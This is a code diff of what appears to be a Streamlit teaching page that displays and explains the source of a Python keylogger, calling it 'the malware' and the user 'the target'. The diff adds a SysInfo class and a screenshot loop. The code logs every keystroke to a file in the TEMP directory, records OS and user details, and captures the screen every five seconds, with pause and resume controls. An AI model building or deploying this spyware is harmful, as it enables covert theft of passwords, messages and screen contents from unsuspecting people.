@@ -204,14 +204,14 @@ class Keylogger:
         self.pause_event.set()
         
     def on_press(self, key):
-        self.pause_event.wait()  #attend si en pause 
+        self.pause_event.wait()  #wait if in  pause 
         with open(self.log_file,'a') as f:
             if key  == keyboard.Key.space:
                 f.write(' ')
             elif key == keyboard.Key.enter:
                 f.write('\n')
-            elif key == keyboard.Key.backspace:
-                f.write(' *backspace* ')
+            elif key == keyboard.Key.backspace: 
+                f.write(' *backspace* ') 
             else: 
                 key_str = str(key).strip("'")
                 (f.write(f"{key_str}"))     
@@ -244,17 +244,24 @@ class Keylogger:
     
     st.write("""The magic happens around the on_press() function. It will open a file (placed in the TEMP directory) 
     and will append as many keys as are pressed by the target. It will translate when it can, and will remove unnecessary strings like " ' ".
-    Threading functions (you can't see them) are used to manage the different functionalities of the malware more correctly.
+    Threading functions  are used to manage the different functionalities of the malware more correctly.
     start, stop, pause and resume function are used in the main file of the malware to prevent race condition.
     """)
     
     st.info("Now, let's see the second class used by the malware")
     
     sysinfo_code = r"""  
+class SysInfo:
+    def __init__(self, log_file_name, screen_file_name):
+        self.log_file_name =  log_file_name
+        self.screen_file_name =  screen_file_name
+        self.pause_event = threading.Event()
+        self.pause_event.set()
+    
     def os_information(self):
         os_inf_gath = platform.platform()
 
-        file_path = tempfile.gettempdir()  # Exemple => C:\Users\Username\AppData\Local\Temp
+        file_path = tempfile.gettempdir()  # Exemple : C:\Users\Username\AppData\Local\Temp
         os.makedirs(file_path, exist_ok=True)
 
         log_file = os.path.join(file_path, self.log_file_name)
@@ -264,16 +271,31 @@ class Keylogger:
             f.write(f"---OS INFORMATION -> {os_inf_gath} : {timestamp} => {name_target}\n")
         return log_file
     
+    
+
     def screen_shot(self):
         os.makedirs(self.screen_file_name, exist_ok=True)
         while True:
-            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            try:
+                timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+                
+                screenshot_path = os.path.join(self.screen_file_name, f"screenshot_{timestamp}.png")
+                
+                screenshot = ImageGrab.grab()
+                screenshot.save(screenshot_path)
+                print(f"Screenshot saved: {screenshot_path}")
+                
+            except Exception as e:
+                print(f"Error capturing screenshot: {e}")
             
-            screenshot_path = os.path.join(self.screen_file_name, f"screenshot_{timestamp}.png")
-            
-            screenshot = ImageGrab.grab()
-            screenshot.save(screenshot_path)
-            print(f"Screenshot saved: {screenshot_path}")
+            time.sleep(5)
+    
+    
+    def pause(self):
+        self.pause_event.clear()
+
+    def resume(self):
+        self.pause_event.set()
     """
     
     
